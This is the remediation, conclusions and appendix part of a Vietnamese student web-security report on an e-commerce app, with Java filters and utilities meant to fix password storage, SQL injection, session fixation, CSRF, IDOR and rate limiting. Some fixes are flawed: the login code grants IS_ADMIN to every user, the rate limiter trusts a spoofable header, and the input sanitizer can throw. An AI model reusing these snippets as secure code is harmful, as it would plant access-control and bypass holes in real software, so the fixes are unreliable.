## 8. BIỆN PHÁP KHẮC PHỤC

### 8.1 🔴 KHẮC PHỤC LỖ HỔNG CRITICAL

#### 8.1.1 Fix Plaintext Password Storage

**Tạo file PasswordUtil.java**:
```java
package com.demo.util;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class PasswordUtil {
    private static final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
    
    public static String hashPassword(String plainPassword) {
        return encoder.encode(plainPassword);
    }
    
    public static boolean verifyPassword(String plainPassword, String hashedPassword) {
        return encoder.matches(plainPassword, hashedPassword);
    }
}
```

**Cập nhật RegisterServlet.java**:
```java
// Thay thế line 52
// kh.setMatKhau(pass); // Lưu plaintext
kh.setMatKhau(PasswordUtil.hashPassword(pass)); // Hash password
```

**Cập nhật LoginServlet.java**:
```java
// Thay thế line 37
// if (aOpt.isPresent() && password.equals(aOpt.get().getMatKhau())) {
if (aOpt.isPresent() && PasswordUtil.verifyPassword(password, aOpt.get().getMatKhau())) {
```

**Migration script cho database**:
```sql
-- Backup existing passwords
CREATE TABLE password_backup AS 
SELECT id, mat_khau FROM khach_hang;

-- Update existing passwords (chỉ cho development)
-- Production cần yêu cầu user reset password
UPDATE khach_hang SET mat_khau = '$2a$12$...' WHERE id = 1; -- BCrypt hash
```

#### 8.1.2 Fix SQL Injection

**Cập nhật GenericDAO.java**:
```java
// Thay thế dynamic orderBy
private static final Set<String> ALLOWED_SORT_COLUMNS = 
    Set.of("id", "tenSanPham", "gia", "ngayTao", "ngayCapNhat");

public Page<T> findAll(int page, int size, String orderBy, boolean asc) {
    // Validate orderBy parameter
    if (orderBy != null && !ALLOWED_SORT_COLUMNS.contains(orderBy)) {
        throw new IllegalArgumentException("Invalid sort column: " + orderBy);
    }
    
    EntityManager em = JPAUtil.em();
    try {
        String alias = "e";
        String order = (orderBy == null || orderBy.isBlank()) ? "" :
                " order by " + alias + "." + orderBy + (asc ? " asc" : " desc");
        
        // Rest of method remains same
    } finally {
        if (em.isOpen()) em.close();
    }
}
```

#### 8.1.3 Fix Session Fixation

**Cập nhật LoginServlet.java**:
```java
// Thay thế session handling
// HttpSession ss = req.getSession(true);

// Invalidate old session
HttpSession oldSession = req.getSession(false);
if (oldSession != null) {
    oldSession.invalidate();
}

// Create new session
HttpSession newSession = req.getSession(true);
newSession.setAttribute("user", su);
newSession.setAttribute("IS_ADMIN", true);
```

#### 8.1.4 Fix Hardcoded Credentials

**Tạo file config.properties**:
```properties
# Database configuration
db.url=${DB_URL:jdbc:postgresql://localhost:5432/electromart}
db.username=${DB_USERNAME:electromart_user}
db.password=${DB_PASSWORD}

# VNPay configuration  
vnpay.tmn_code=${VNPAY_TMN_CODE}
vnpay.hash_secret=${VNPAY_HASH_SECRET}
```

**Cập nhật persistence.xml**:
```xml
<property name="jakarta.persistence.jdbc.url" value="${db.url}"/>
<property name="jakarta.persistence.jdbc.user" value="${db.username}"/>
<property name="jakarta.persistence.jdbc.password" value="${db.password}"/>
```

### 8.2 🟠 KHẮC PHỤC LỖ HỔNG HIGH

#### 8.2.1 Implement CSRF Protection

**Tạo CSRFFilter.java**:
```java
package com.demo.filter;

import jakarta.servlet.*;
import jakarta.servlet.annotation.WebFilter;
import jakarta.servlet.http.*;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.Base64;

@WebFilter("/*")
public class CSRFFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        
        // Generate CSRF token for GET requests
        if ("GET".equals(req.getMethod())) {
            String token = generateCSRFToken();
            req.getSession().setAttribute("csrf_token", token);
        }
        
        // Validate CSRF token for POST requests
        if ("POST".equals(req.getMethod())) {
            String sessionToken = (String) req.getSession().getAttribute("csrf_token");
            String requestToken = req.getParameter("csrf_token");
            
            if (sessionToken == null || !sessionToken.equals(requestToken)) {
                resp.sendError(HttpServletResponse.SC_FORBIDDEN, "CSRF token mismatch");
                return;
            }
        }
        
        chain.doFilter(request, response);
    }
    
    private String generateCSRFToken() {
        SecureRandom random = new SecureRandom();
        byte[] bytes = new byte[32];
        random.nextBytes(bytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
    }
}
```

**Cập nhật JSP forms**:
```jsp
<!-- Thêm vào tất cả forms -->
<input type="hidden" name="csrf_token" value="${sessionScope.csrf_token}" />
```

#### 8.2.2 Fix IDOR Vulnerabilities

**Cập nhật OrdersServlet.java**:
```java
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {
    
    SessionUser user = (SessionUser) req.getSession().getAttribute("user");
    if (user == null) {
        resp.sendRedirect(req.getContextPath() + "/login");
        return;
    }
    
    String orderIdParam = req.getParameter("id");
    if (orderIdParam != null) {
        try {
            Long orderId = Long.parseLong(orderIdParam);
            DonHang order = donHangDAO.findById(orderId);
            
            // IDOR Protection: Check ownership
            if (order == null || !order.getKhachHang().getId().equals(user.getId())) {
                resp.sendError(HttpServletResponse.SC_FORBIDDEN, "Access denied");
                return;
            }
            
            req.setAttribute("order", order);
        } catch (NumberFormatException e) {
            resp.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid order ID");
            return;
        }
    }
    
    // Rest of method...
}
```

#### 8.2.3 Implement Rate Limiting

**Tạo RateLimitFilter.java**:
```java
package com.demo.filter;

import jakarta.servlet.*;
import jakarta.servlet.annotation.WebFilter;
import jakarta.servlet.http.*;
import java.io.IOException;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

@WebFilter(urlPatterns = {"/login", "/register", "/forgot-password"})
public class RateLimitFilter implements Filter {
    
    private final ConcurrentHashMap<String, AtomicInteger> requestCounts = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, Long> lastRequestTime = new ConcurrentHashMap<>();
    
    private static final int MAX_REQUESTS = 5; // 5 requests
    private static final long TIME_WINDOW = 300000; // 5 minutes
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        
        String clientIP = getClientIP(req);
        long currentTime = System.currentTimeMillis();
        
        // Reset counter if time window expired
        Long lastTime = lastRequestTime.get(clientIP);
        if (lastTime == null || (currentTime - lastTime) > TIME_WINDOW) {
            requestCounts.put(clientIP, new AtomicInteger(0));
            lastRequestTime.put(clientIP, currentTime);
        }
        
        // Check rate limit
        AtomicInteger count = requestCounts.get(clientIP);
        if (count != null && count.incrementAndGet() > MAX_REQUESTS) {
            resp.sendError(HttpServletResponse.SC_TOO_MANY_REQUESTS, 
                          "Rate limit exceeded. Try again later.");
            return;
        }
        
        chain.doFilter(request, response);
    }
    
    private String getClientIP(HttpServletRequest request) {
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
            return xForwardedFor.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }
}
```

### 8.3 🟡 KHẮC PHỤC LỖ HỔNG MEDIUM

#### 8.3.1 Add Security Headers

**Tạo SecurityHeadersFilter.java**:
```java
package com.demo.filter;

import jakarta.servlet.*;
import jakarta.servlet.annotation.WebFilter;
import jakarta.servlet.http.*;
import java.io.IOException;

@WebFilter("/*")
public class SecurityHeadersFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse resp = (HttpServletResponse) response;
        
        // Prevent clickjacking
        resp.setHeader("X-Frame-Options", "DENY");
        
        // Prevent MIME type sniffing
        resp.setHeader("X-Content-Type-Options", "nosniff");
        
        // Enable XSS protection
        resp.setHeader("X-XSS-Protection", "1; mode=block");
        
        // Force HTTPS
        resp.setHeader("Strict-Transport-Security", 
                      "max-age=31536000; includeSubDomains; preload");
        
        // Content Security Policy
        resp.setHeader("Content-Security-Policy", 
                      "default-src 'self'; " +
                      "script-src 'self' 'unsafe-inline'; " +
                      "style-src 'self' 'unsafe-inline'; " +
                      "img-src 'self' data: https:; " +
                      "font-src 'self'; " +
                      "connect-src 'self'");
        
        // Referrer Policy
        resp.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
        
        // Permissions Policy
        resp.setHeader("Permissions-Policy", 
                      "camera=(), microphone=(), geolocation=()");
        
        chain.doFilter(request, response);
    }
}
```

#### 8.3.2 Secure Session Management

**Cập nhật web.xml**:
```xml
<session-config>
    <session-timeout>30</session-timeout>
    <cookie-config>
        <http-only>true</http-only>
        <secure>true</secure>
        <same-site>Strict</same-site>
        <max-age>1800</max-age>
    </cookie-config>
    <tracking-mode>COOKIE</tracking-mode>
</session-config>
```

#### 8.3.3 Input Validation Framework

**Tạo ValidationUtil.java**:
```java
package com.demo.util;

import org.apache.commons.validator.routines.EmailValidator;
import java.util.regex.Pattern;

public class ValidationUtil {
    
    private static final Pattern PHONE_PATTERN = 
        Pattern.compile("^[0-9]{10,11}$");
    private static final Pattern NAME_PATTERN = 
        Pattern.compile("^[a-zA-ZÀ-ỹ\\s]{2,50}$");
    
    public static boolean isValidEmail(String email) {
        return EmailValidator.getInstance().isValid(email);
    }
    
    public static boolean isValidPhone(String phone) {
        return phone != null && PHONE_PATTERN.matcher(phone).matches();
    }
    
    public static boolean isValidName(String name) {
        return name != null && NAME_PATTERN.matcher(name).matches();
    }
    
    public static boolean isValidPassword(String password) {
        if (password == null || password.length() < 8) {
            return false;
        }
        
        // At least one uppercase, one lowercase, one digit, one special char
        return password.matches("^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$");
    }
    
    public static String sanitizeInput(String input) {
        if (input == null) return "";
        
        return input.trim()
                   .replaceAll("[<>\"'&]", "") // Remove dangerous chars
                   .substring(0, Math.min(input.length(), 255)); // Limit length
    }
}
```

### 8.4 Logging và Monitoring

**Tạo SecurityLogger.java**:
```java
package com.demo.util;

import java.util.logging.Logger;
import java.util.logging.Level;

public class SecurityLogger {
    private static final Logger logger = Logger.getLogger(SecurityLogger.class.getName());
    
    public static void logLoginAttempt(String email, String ip, boolean success) {
        String message = String.format("Login attempt: email=%s, ip=%s, success=%s", 
                                     email, ip, success);
        logger.log(success ? Level.INFO : Level.WARNING, message);
    }
    
    public static void logSuspiciousActivity(String activity, String ip, String userAgent) {
        String message = String.format("Suspicious activity: %s, ip=%s, userAgent=%s", 
                                     activity, ip, userAgent);
        logger.log(Level.SEVERE, message);
    }
    
    public static void logDataAccess(String resource, String userId, String ip) {
        String message = String.format("Data access: resource=%s, user=%s, ip=%s", 
                                     resource, userId, ip);
        logger.log(Level.INFO, message);
    }
}
```
---

## 9. KẾT LUẬN VÀ KHUYẾN NGHỊ

### 9.1 Tóm tắt kết quả

Qua quá trình phân tích và kiểm thử bảo mật hệ thống ElectroMart, nhóm đã phát hiện **13 lỗ hổng bảo mật** với các mức độ nghiêm trọng khác nhau:

- **5 lỗ hổng Critical**: Cần khắc phục ngay lập tức
- **5 lỗ hổng High**: Ưu tiên cao trong kế hoạch khắc phục  
- **3 lỗ hổng Medium**: Khắc phục trong giai đoạn tiếp theo

### 9.2 Đánh giá rủi ro tổng thể

**Mức độ rủi ro**: 🔴 **NGHIÊM TRỌNG**

Hệ thống hiện tại có nhiều lỗ hổng bảo mật nghiêm trọng, đặc biệt:
- Lưu trữ mật khẩu plaintext (CVSS 9.8)
- SQL Injection tiềm ẩn (CVSS 9.0)  
- Weak Authentication (CVSS 8.5)
- Hardcoded credentials (CVSS 8.0)

### 9.3 Roadmap khắc phục

#### **Giai đoạn 1: Khẩn cấp (1-2 tuần)**
1. ✅ Hash tất cả passwords với BCrypt
2. ✅ Fix SQL injection trong GenericDAO
3. ✅ Implement CSRF protection
4. ✅ Regenerate session IDs sau login
5. ✅ Externalize hardcoded credentials

#### **Giai đoạn 2: Ưu tiên cao (2-4 tuần)**
6. ✅ Add proper authorization checks (IDOR)
7. ✅ Implement rate limiting
8. ✅ Secure password reset mechanism
9. ✅ Add comprehensive input validation
10. ✅ Strengthen authentication mechanisms

#### **Giai đoạn 3: Cải thiện (1-2 tháng)**
11. ✅ Add security headers
12. ✅ Secure session management
13. ✅ Implement security logging & monitoring
14. ✅ Regular security testing & code review

### 9.4 Khuyến nghị dài hạn

#### **9.4.1 Secure Development Lifecycle (SDLC)**
- **Code Review**: Bắt buộc review code trước khi merge
- **Static Analysis**: Sử dụng tools như SonarQube, Checkmarx
- **Dependency Scanning**: Kiểm tra vulnerabilities trong dependencies
- **Security Testing**: Tích hợp security tests vào CI/CD pipeline

#### **9.4.2 Security Training**
- **Developer Training**: Đào tạo secure coding cho team
- **Security Awareness**: Nâng cao nhận thức bảo mật
- **Regular Updates**: Cập nhật kiến thức về threats mới

#### **9.4.3 Infrastructure Security**
- **WAF**: Deploy Web Application Firewall
- **HTTPS**: Bắt buộc sử dụng HTTPS cho tất cả traffic
- **Database Security**: Encrypt database, restrict access
- **Backup & Recovery**: Backup định kỳ và test recovery

#### **9.4.4 Monitoring & Response**
- **SIEM**: Security Information and Event Management
- **Intrusion Detection**: Phát hiện tấn công real-time
- **Incident Response**: Quy trình xử lý sự cố bảo mật
- **Penetration Testing**: Kiểm thử định kỳ bởi third-party

### 9.5 Compliance và Standards

#### **9.5.1 Tuân thủ quy định**
- **PDPA**: Bảo vệ dữ liệu cá nhân (Việt Nam)
- **PCI DSS**: Nếu xử lý thẻ tín dụng
- **ISO 27001**: Quản lý bảo mật thông tin

#### **9.5.2 Security Frameworks**
- **OWASP Top 10**: Theo dõi và khắc phục
- **NIST Cybersecurity Framework**: Áp dụng best practices
- **CIS Controls**: Implement security controls

### 9.6 Metrics và KPIs

#### **9.6.1 Security Metrics**
- **Vulnerability Count**: Số lượng lỗ hổng theo thời gian
- **MTTR**: Mean Time To Remediation
- **Security Test Coverage**: Tỷ lệ code được test bảo mật
- **Incident Response Time**: Thời gian phản ứng sự cố

#### **9.6.2 Business Impact**
- **Downtime Reduction**: Giảm thời gian gián đoạn
- **Customer Trust**: Tăng độ tin cậy của khách hàng
- **Compliance Cost**: Giảm chi phí tuân thủ
- **Brand Protection**: Bảo vệ thương hiệu

### 9.7 Phân công công việc nhóm

#### **Thành viên 1**: [Tên] - Security Analysis & Documentation
- Phân tích lỗ hổng bảo mật
- Viết báo cáo chi tiết
- Tạo security guidelines

#### **Thành viên 2**: [Tên] - Penetration Testing & Exploitation
- Thực hiện manual testing
- Sử dụng automated tools (ZAP, SQLMap)
- Proof of concept exploits

#### **Thành viên 3**: [Tên] - Remediation & Implementation  
- Implement security fixes
- Code review và testing
- Deploy security measures

### 9.8 Lessons Learned

#### **9.8.1 Những điều học được**
1. **Security by Design**: Bảo mật phải được tích hợp từ đầu
2. **Defense in Depth**: Nhiều lớp bảo vệ thay vì dựa vào một điểm
3. **Regular Testing**: Kiểm thử bảo mật phải thường xuyên
4. **Team Awareness**: Toàn team phải có ý thức bảo mật

#### **9.8.2 Challenges gặp phải**
1. **Legacy Code**: Code cũ khó refactor
2. **Time Constraints**: Áp lực thời gian ảnh hưởng quality
3. **Knowledge Gap**: Thiếu kiến thức về security
4. **Tool Limitations**: Automated tools không phát hiện hết

### 9.9 Future Work

#### **9.9.1 Kế hoạch tiếp theo**
- **API Security**: Bảo mật cho REST APIs
- **Mobile Security**: Nếu có mobile app
- **Cloud Security**: Khi migrate lên cloud
- **AI/ML Security**: Bảo mật cho AI features

#### **9.9.2 Research Areas**
- **Zero Trust Architecture**: Mô hình bảo mật mới
- **DevSecOps**: Tích hợp security vào DevOps
- **Threat Intelligence**: Thông tin về threats mới
- **Quantum-Safe Cryptography**: Chuẩn bị cho tương lai

---

## 10. PHỤ LỤC

### 10.1 Danh sách công cụ sử dụng

#### **Manual Testing Tools**
- **Burp Suite Community**: Web vulnerability scanner
- **OWASP ZAP**: Free security testing proxy
- **Postman**: API testing và security testing
- **Browser DevTools**: Inspect và modify requests

#### **Automated Scanning Tools**
- **SQLMap**: Automated SQL injection testing
- **Nikto**: Web server scanner
- **Nmap**: Network discovery và port scanning
- **Dirb/Gobuster**: Directory và file discovery

#### **Code Analysis Tools**
- **SonarQube**: Static code analysis
- **SpotBugs**: Java bug detection
- **OWASP Dependency Check**: Vulnerability scanning
- **Checkmarx**: Commercial SAST tool

### 10.2 Tài liệu tham khảo

#### **Security Standards**
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Controls](https://www.cisecurity.org/controls/)

#### **Technical References**
- [Jakarta EE Security](https://jakarta.ee/specifications/security/)
- [Spring Security Documentation](https://spring.io/projects/spring-security)
- [PostgreSQL Security](https://www.postgresql.org/docs/current/security.html)
- [Java Cryptography Architecture](https://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/CryptoSpec.html)

### 10.3 Sample Code Repository

Tất cả code fixes và security implementations được lưu trong repository:
```
project-security-fixes/
├── src/
│   ├── main/java/com/demo/
│   │   ├── filter/          # Security filters
│   │   ├── util/            # Security utilities  
│   │   └── controller/      # Fixed controllers
│   └── main/resources/
│       ├── security/        # Security configs
│       └── sql/            # Database patches
├── docs/
│   ├── security-guide.md   # Security guidelines
│   └── deployment.md       # Secure deployment guide
└── tests/
    ├── security/           # Security test cases
    └── integration/        # Integration tests
```

### 10.4 Contact Information

**Security Team**: security@electromart.com  
**Emergency Hotline**: +84-xxx-xxx-xxx  
**Report Date**: 22/03/2026  
**Next Review**: 22/06/2026

---

**⚠️ QUAN TRỌNG**: Báo cáo này chứa thông tin nhạy cảm về lỗ hổng bảo mật. Vui lòng:
- Không chia sẻ ra bên ngoài tổ chức
- Khắc phục các lỗ hổng Critical trước khi deploy production
- Thực hiện penetration testing sau khi fix
- Cập nhật báo cáo sau mỗi lần khắc phục

**📝 Ghi chú**: Đây là báo cáo bảo mật cho đồ án cuối kỳ môn Bảo mật Web, học kỳ 1/2025-2026.